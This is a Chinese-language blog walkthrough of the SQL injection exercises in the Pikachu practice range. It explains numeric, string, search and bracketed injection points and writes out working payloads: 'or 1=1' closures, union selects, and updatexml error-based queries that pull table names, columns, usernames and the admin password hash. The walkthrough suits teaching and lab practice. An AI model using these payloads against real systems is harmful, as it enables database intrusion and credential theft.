<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#3367D6"/>
  <link rel="apple-touch-icon" href="/icons-192.png">
  <link rel="manifest" href="/manifest.json">
  
  <meta name="generator" content="Hexo 5.4.0">

  

  

  
    <meta name="author" content="John Doe">
  

  

  

  <title>Pikachu靶场-SQL-Inject | Hexo</title>

  

  
    <link rel="shortcut icon" href="/favicon.ico">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
  

  
<link rel="stylesheet" href="/css/style.css">

</head>
<body>
  <div class="root-container">
    
<!-- header container -->
<header class="header-container post">
  
    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
  

  <!-- navbar -->
<nav class="navbar">
  <div class="navbar-content">
    <!-- logo -->
    <div class="navbar-logo">
      <a href="/">
        
          Hexo
        
      </a>
    </div>
    <!-- link -->
    <div class="navbar-link">
      <div class="navbar-btn">
        <div></div>
        <div></div>
        <div></div>
      </div>
      <ul class="navbar-list">
        
          <li class="navbar-list-item"><a href="/">首页</a></li>
        
          <li class="navbar-list-item"><a href="/links">友链</a></li>
        
          <li class="navbar-list-item"><a href="/about">关于</a></li>
        
      </ul>
    </div>
  </div>
</nav>

  
  

  
  

  
  

  
  

  
  
    <div class="header-content">
      <div class="post-text layout-block">
        <div class="layout-margin">
          <h1 class="title-wrap">Pikachu靶场-SQL-Inject</h1>
          <h2 class="title-sub-wrap">
            <strong>John Doe</strong>
            <span>发布于</span>
            <time  class="article-date" datetime="2021-11-16T14:29:58.000Z" itemprop="datePublished">2021-11-16</time>
          </h2>
          <ul class="wrap-list dark">
  
</ul>
          <ul class="wrap-list dark">
  
</ul>
        </div>
      </div>
    </div>
  

  
  
  
</header>

    <!-- 文章 -->

<!-- 文章内容 -->
<div class="body-container">
  <article class="content-container layout-block post-container">
    <div class="article-info">
      
      
      
      
      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
        <p>SQL Inject 漏洞原理概述</p>
<p>   owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br>    一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>    SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。<br>    在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>    1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>    2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>    3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重! </p>
<h1 id="SQL-Inject攻击流程"><a href="#SQL-Inject攻击流程" class="headerlink" title="SQL Inject攻击流程"></a>SQL Inject攻击流程</h1><p><strong>第一步：注入点探测</strong><br>自动：使用web漏洞扫描工具，自动进行注入点的发现<br>手动：手工构造sql inject测试语句注入点发现<br><strong>第二步：信息获取</strong><br>通过注入点去取到期望的数据<br>1.环境信息：数据库类型，数据库版本，操作系统版本，用户信息<br>2.数据库信息：数据库名称，数据库表，表字段    ，字段内容<br><strong>第三步：获取权限</strong><br>获取操作系统权限：通过数据库执行shell，上传木马</p>
<h1 id="如何判断注入点类型及常见注入类型"><a href="#如何判断注入点类型及常见注入类型" class="headerlink" title="如何判断注入点类型及常见注入类型"></a>如何判断注入点类型及常见注入类型</h1><p><strong>常见类型</strong><br><strong>·</strong> 数字型 <code>user id=$id</code><br><strong>·</strong> 字符型 <code>user id=&#39;$id&#39;</code><br><strong>·</strong> 搜索型 <code>text like &#39;%&#123;$_GET[&#39;search&#39;]&#125;%&#39;</code></p>
<p><strong>如何判断常见类型呢？</strong><br>我们就是看他输入的变量，当变量传到sql语句中的时候，是以什么类型拼接进去的<br>纯数字类型的话，就是数字型<br>如果是有单引号或者双引号，以一个字符串的形式拼接进去，就是字符型<br>如果有like ‘% %’这样的，就是搜索型</p>
<h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>首先还是看我们的Pikachu<br><img src="https://img-blog.csdnimg.cn/36b1a346327546acbadf7fe533a2deff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这就是一个输入点</p>
<p>我们来搜索看一下</p>
<p><img src="https://img-blog.csdnimg.cn/04255b65fb744bf8bd5249da6a2104aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到参数不是在URL中提交，可见它是post请求<br><img src="https://img-blog.csdnimg.cn/a767144f5cfc4f9597c33c8929da65ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们来抓包看一看</p>
<p><img src="https://img-blog.csdnimg.cn/6d1bb0a2328d4019943378ceb89254aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这时候，我们来想一想，它后台是个什么操作<br>前端接受到这个数字1<br>然后，前端获取到输入后，把这个输入放到对应的数据库操作中<br>然后获取数据库的信息<br>大致是这么个流程吧<br>那么它通过sql语句操作数据库的地方是怎么搞呢？<br>我们猜测<br>后端通过查询1，然后返回了email和name</p>
<p>大致就是 <code>select 字段1，字段2 from 表名 where id=1;</code><br>这样的话，我们就清楚了<br>如果构造一个非法的sql语句，它会不会去执行呢？<br>我们来试试<br><code>select  字段1，字段2 from 表名 where id=1 or 1=1;</code></p>
<p>我们将刚刚抓到的包中数据修改，然后Forward<br><img src="https://img-blog.csdnimg.cn/6b85b3a40f574a73ab71fd2918f608ed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现数据都被显示了出来<br><img src="https://img-blog.csdnimg.cn/e9a878453afc4fbfa17fe73066433583.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>其实这就是一个数字型注入的sql漏洞</p>
<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>我们来看字符型</p>
<p><img src="https://img-blog.csdnimg.cn/ae3a3ed269e84c9996cf1720700aa645.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们输入kobe看看</p>
<p><img src="https://img-blog.csdnimg.cn/64b840f1f55647749109cafda0712c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们的id为3，邮箱为<a href="mailto:&#107;&#111;&#98;&#x65;&#x40;&#x70;&#105;&#107;&#97;&#x63;&#x68;&#117;&#x2e;&#99;&#x6f;&#x6d;">&#107;&#111;&#98;&#x65;&#x40;&#x70;&#105;&#107;&#97;&#x63;&#x68;&#117;&#x2e;&#99;&#x6f;&#x6d;</a></p>
<p>我们还是像数字型一样，想想它是怎么个操作</p>
<p>我们猜想它操作数据库的语句<br><code>select 字段1，字段2，from 表名 where username =&#39;kobe&#39;;</code><br>(这边要说一下，因为是字符串，如果没有这个单引号的话，就会报错)</p>
<p>那么，我们来构造一个payload，我们根据之前的思路</p>
<p>kobe or 1=1</p>
<p>会发现，查不出来，这就是这个单引号的问题</p>
<p>这里我们就要构造闭合了</p>
<p>kobe’ or 1=1 #</p>
<p>这里我们解释一下，单引号就是为了闭合前面的单引号，#就是为了注释后面的单引号</p>
<p>构造完成后，我们来试试</p>
<p><img src="https://img-blog.csdnimg.cn/74442c2c31fd44e6a2e332d2764fa10f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提交后</p>
<p><img src="https://img-blog.csdnimg.cn/413172810ddc43ae9d9fb20398315046.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功输出全部内容</p>
<p>这里如果想要通过url来写的话，还需要多做一个URL的编码<br><img src="https://img-blog.csdnimg.cn/856ff053a9b44e5e90fe1c8c54753a3d.png" alt="在这里插入图片描述"><br>其实跟我们之前的数字型大同小异</p>
<p>它这里区别只是在拼接变量的时候，用了一个字符串（单引号）</p>
<p>这就是一个字符型的sql注入漏洞</p>
<h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>上来，我们先搜一下<br><img src="https://img-blog.csdnimg.cn/e4f3386843a94aa1a1e51a5c257c199e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>同样的老规矩，我们还是判断它后台是个怎么回事</p>
<p><code>selece 字段1，字段2，字段3 from 表名 where  username like &#39;%xx%&#39;</code></p>
<p>我们还是来构造闭合<br>a%’ or 1=1#<br>(%’是闭合前面，#是注释后面)</p>
<p>我们试试看</p>
<p><img src="https://img-blog.csdnimg.cn/75ef8c074e6d4b82b44cdfd801fdda6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>拿下~</p>
<p>这就是一个搜索型的sql注入漏洞</p>
<h3 id="XX型"><a href="#XX型" class="headerlink" title="XX型"></a>XX型</h3><p>我们还是一样的搜索一下<br><img src="https://img-blog.csdnimg.cn/5d15f68dcb024bd9b0a387afe16fa276.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里我们考虑它是一个字符串的话，我们来构造一个payload</p>
<p>kobe’ or 1=1#</p>
<p>但是在搜索之后，它提示我们有一个sql语法错误<br><img src="https://img-blog.csdnimg.cn/0ffa9667fc6448bbaf756d95df523c26.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这就说明，它里面不只是单引号来拼接了</p>
<p>通过查看它的源码，我们发现它还多加了一个括号</p>
<p><img src="https://img-blog.csdnimg.cn/5a00195a9f6d4df09eb1010d999a3d67.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们还是来构造闭合</p>
<p>a’)union select version(),database()#<br>(这里是用union联合查询来看一看数据库的版本和名称，接下来就会讲到了)</p>
<p><img src="https://img-blog.csdnimg.cn/a64a3e718ac24535aab47525d6f32721.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到，数据库版本为5.7.26，名称为pikachu</p>
<h1 id="SQL-Inject-手工测试"><a href="#SQL-Inject-手工测试" class="headerlink" title="SQL Inject 手工测试"></a>SQL Inject 手工测试</h1><h3 id="基于union联合查询的信息获取"><a href="#基于union联合查询的信息获取" class="headerlink" title="基于union联合查询的信息获取"></a>基于union联合查询的信息获取</h3><h5 id="Union的联合查询、order-by的补充知识"><a href="#Union的联合查询、order-by的补充知识" class="headerlink" title="Union的联合查询、order by的补充知识"></a>Union的联合查询、order by的补充知识</h5><p>union 联合查询：可以通过联合查询来查询指定数据<br>union 操作符用于合并两个或多个 select 语句的结果集。</p>
<p>用法：<br>select username,password from table_name1 where id=1<br>union<br>select 字段1，字段2 from table_name2</p>
<p>这里要注意，联合查询的字段数要和主查询一致</p>
<p>order by<br>order by 语句用于根据指定的列对结果集进行排序。</p>
<p>order by 语句默认按照升序对记录进行排序。</p>
<p>我们用order by来排序，其实是看它存不存在</p>
<p>order by 1  有回显<br>order by 2  有回显<br>order by 3  无回显<br>说明主查询中只有两个字段</p>
<h5 id="information-schema数据库的介绍"><a href="#information-schema数据库的介绍" class="headerlink" title="information_schema数据库的介绍"></a>information_schema数据库的介绍</h5><p>在mysql中，自带的information_ schema这 个表里面存放了大量的重要信息。具体如下:<br>如果存在注入点的话，可以直接尝试对该数据库进行访问，从而获取更多的信息。<br>比如:<br>SCHEMATA表:提供了当前mysq|实例中所有数据库的信息。是show databases的结果取之此表。<br>TABLES表:提供了关于数据库中的表的信息(包括视图) .详细表述了某个表属于哪个schema ,表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。<br>COLUMNS表:提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columnsfrom schemaname.tablename的结果取之此表。</p>
<h5 id="基于Union的联合查询（select）"><a href="#基于Union的联合查询（select）" class="headerlink" title="基于Union的联合查询（select）"></a>基于Union的联合查询（select）</h5><p>这里我们用字符型来做演示（其实其他的也行，只是闭合条件不同而已）</p>
<p>首先，我们要进行一个order by的字段猜测</p>
<p>通常我们使用二分法</p>
<p>构造闭合 <code>a&#39; order by 10#</code><br><img src="https://img-blog.csdnimg.cn/0bf08e68d98742cea03218ef36493b6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>它提示我们10不存在</p>
<p>然后我们用5</p>
<p><img src="https://img-blog.csdnimg.cn/fdaf3217d5ac415d952a4acddd9e8c85.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>5也不行，继续3</p>
<p><img src="https://img-blog.csdnimg.cn/cafc62e806fc4cb6a06e3f5dbb48187e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>接着再来，2</p>
<p><img src="https://img-blog.csdnimg.cn/5f2660b56495438aad0ce3cf95fc04b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>它提示我们输入的用户a不存在<br>这样就可以知道order by正常执行<br>主查询字段为2</p>
<p>然后我们用union进行拼接</p>
<p>构造闭合<br>a’ union select database(),version()#</p>
<p>我们输入试试<br><img src="https://img-blog.csdnimg.cn/c8675e3fd0d042a38019c14cd2794e73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>数据库名称为pikahcu，版本为5.7.26</p>
<h3 id="基于报错信息的获取"><a href="#基于报错信息的获取" class="headerlink" title="基于报错信息的获取"></a>基于报错信息的获取</h3><h4 id="常用的报错函数updatexml-、extractvalue-、floor"><a href="#常用的报错函数updatexml-、extractvalue-、floor" class="headerlink" title="常用的报错函数updatexml()、extractvalue()、floor()"></a>常用的报错函数updatexml()、extractvalue()、floor()</h4><p>updatexml()：函数是MySQL对XML文档数据进行查询和修改的XPATH函数</p>
<p>作用：改变（查找并替换）xml文档中符合条件的节点的值<br>语法：UPDATEXML(xml_document,XPathstring,new_vaule)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：fiedname是String格式，为表中的字段名</span><br><span class="line">第二个参数：XPathstring（Xpath格式的字符串）</span><br><span class="line">第三个参数：new_value,String格式，替换查找到的符合条件的</span><br><span class="line">Xpath定位必须是有效的，否则会发生错误 </span><br></pre></td></tr></table></figure>

<p>extractvalue()：函数也是MySQL对XML文档进行查询的XPATH函数<br>作用：从目标xml中返回包含所查询值的字符串<br>语法：ExtractValue（xml_document,xpath_string）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：xml_document是String格式，为xml文档对象的名称，文中为doc</span><br><span class="line">第二个参数：Xpath_string(Xpath格式的字符串)</span><br><span class="line">Xpath定位必须是有效的，否则会发生错误</span><br></pre></td></tr></table></figure>

<p>floor()：MySQL中用来取整的函数</p>
<h4 id="基于函数报错的信息获取（select-insert-update-delete）"><a href="#基于函数报错的信息获取（select-insert-update-delete）" class="headerlink" title="基于函数报错的信息获取（select/insert/update/delete）"></a>基于函数报错的信息获取（select/insert/update/delete）</h4><p>思路：在MYSQL中，使用一些指定函数来制造报错，从而从报错信息中获取设定的信息<br>select/insert/update/delete都可以使用报错来获取信息<br>背景：<br>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端</p>
<h6 id="updatexml函数报错"><a href="#updatexml函数报错" class="headerlink" title="updatexml函数报错"></a>updatexml函数报错</h6><p>通过pikachu演示select下报错的利用</p>
<p>我们首先确定它要有报错信息的返回</p>
<p>先输入一个单引号构造一个错误的语法<br><img src="https://img-blog.csdnimg.cn/d8af62fad0424e238a057e43f346a220.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>有报错会返回到前端</p>
<p><img src="https://img-blog.csdnimg.cn/a2a2c9dbd5e64f419e26f4089a13269c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们用updatexml这个函数构造一个报错，通过报错获取相关的信息</p>
<p>构造一个payload<br>kobe’ and updatexml(1,version(),0)#</p>
<p>报错了<br><img src="https://img-blog.csdnimg.cn/21310559a8fa4029b08a175af4e21240.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里发现有一部分内容没有了<br>我们对payload进行一下改造</p>
<p>用cancat将两个参数组合在一起<br><code>kobe&#39; and updatexml(1,concat(0x7e,version()),0)#</code></p>
<p>(0x7e是~的十六进制)</p>
<p>再来试试</p>
<p><img src="https://img-blog.csdnimg.cn/0d2ec704b6f64adea388acd923ececd2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再来试试</p>
<p><code>kobe&#39; and updatexml(1,concat(0x7e,database()),0)#</code></p>
<p><img src="https://img-blog.csdnimg.cn/f91104340afe49fca0ff6168297a1195.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这样，只要我们把version这个表达式替换成我们想要的表达式就可以了</p>
<p>我们来获取一下表的信息<br>kobe ‘ and updatexml(1, concat(0x7e,(select table_ name from information_ schema.tables where table_ schema=’pikachu’)),0)#</p>
<p><img src="https://img-blog.csdnimg.cn/7e6454ecc15b466ea2ee13ea746aaa7a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里它提示我们显示的东西超过一行</p>
<p>我们只需要多操作几次<br>让它的结果只显示一行</p>
<p><code>kobe&#39; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1)),0)#</code></p>
<p><code>kobe&#39; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 1,1)),0)#</code></p>
<p><code>kobe&#39; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 2,1)),0)#</code></p>
<p>获取到表名以后，我们来获取列名</p>
<p><code>kobe&#39; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)),0)#</code></p>
<p><img src="https://img-blog.csdnimg.cn/458fd95a20ab46ef96de6d4d86d18d4b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>获取到列之后，再来获取数据</p>
<p><code>kobe&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</code></p>
<p><img src="https://img-blog.csdnimg.cn/e14b0555432b45b8b30fcc72c1076d78.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><code>kobe&#39; and updatexml(1,concat(0x7e,(select password from users where username=&#39;admin&#39; limit 0,1)),0)#</code></p>
<p><img src="https://img-blog.csdnimg.cn/a7ce406447824195b074d0fdefee64fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>获得了md5加密的密码</p>
<p>我们之前都是通过select去做了相应的操作<br>那如果是Insert、update、delete的注入呢？<br>我们应该如何进行操作</p>
<p>我们来看看</p>
<p><img src="https://img-blog.csdnimg.cn/62dc0fd1cbfc4f41afe40173fdf699c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们这里点一下注册</p>
<p>先来判断它是否会报错<br>我们在必填项中输入单引号<br><img src="https://img-blog.csdnimg.cn/7f4a6acbec084cd29a693b025fb6e1d4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>提交之后，它提示我们有SQL语法错误</p>
<p><img src="https://img-blog.csdnimg.cn/c0cb163c9b824abdbd8a8c5cd64ab2bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们按照之前select的思路来想一下<br>它数据库的语句应该是怎么样的</p>
<p>盲猜是这样的形式</p>
<p><code>insert into member(字段1，字段2，字段3) values(&#39;xxx&#39;,1,2,3);</code></p>
<p>如何构造闭合呢<br>我们一般采取or进行闭合</p>
<p>构造一下<br><code>a&#39; or updatexml (1,concat(0x7e,database()),0)  or &#39;</code></p>
<p>前面的单引号闭合前面的<br>后面的闭合后面的</p>
<p>我们来测试一下<br><img src="https://img-blog.csdnimg.cn/08b997b264fe442d8d1aad51a1a11fa6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/4ba10051caef46a8abbfba47ae8d7af7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拿到了数据库名称~</p>
<p>其实跟我们之前的select的思路一样，只是闭合要用一个or<br>这就是一个insert报错注入的漏洞</p>
<p>update 和 insert也是一样的<br>这里就不多讲了<br>我们直接来测试一下</p>
<p>payload就用这个<br>a’ or updatexml (1,concat(0x7e,database()),0)  or ‘</p>
<p>首先登录一下<br><img src="https://img-blog.csdnimg.cn/ca42c74b626f46f4aa6dd06c8108d52f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>然后将payload写在修改的地方</p>
<p><img src="https://img-blog.csdnimg.cn/274274d2a7d14f26829d2c88bd9364fc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>提交</p>
<p><img src="https://img-blog.csdnimg.cn/80f0bca7fd2b4cde939e0d096873b509.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过报错拿到了数据库名称~</p>
<p>那么delete的报错如何来做呢？</p>
<p><img src="https://img-blog.csdnimg.cn/5caa507ce3d84e68a4c89ca6f7be3b95.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们来删除一个留言，然后看burp抓到的包</p>
<p><img src="https://img-blog.csdnimg.cn/26d46eeb2b6c478fa9367c62bdde89b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将它放到Repeater<br>我们就可以将这个id进行闭合<br><img src="https://img-blog.csdnimg.cn/9ed04135e66b4ed09b956c5ffb28d7da.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们来构造一个payload</p>
<p>1 or updatexml(1,concat(0x7e,database()),0)</p>
<p>修改id的值<br><img src="https://img-blog.csdnimg.cn/4c518209a0bf4a4a922dda4c86d59768.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后因为这里是通过url提交的，我们要进行一个url的编码</p>
<p><img src="https://img-blog.csdnimg.cn/5b22c8556efd419abf19745f7a422286.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们点go，重发一遍</p>
<p><img src="https://img-blog.csdnimg.cn/98e1ddc24b874fc5baaa204b6b1f59e8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再一次拿到了数据库的名称~</p>
<p>以上就是基于报错函数updatexml了漏洞利用了</p>
<h6 id="extractvalue函数报错"><a href="#extractvalue函数报错" class="headerlink" title="extractvalue函数报错"></a>extractvalue函数报错</h6><p>extractvalue报错函数也是一个道理</p>
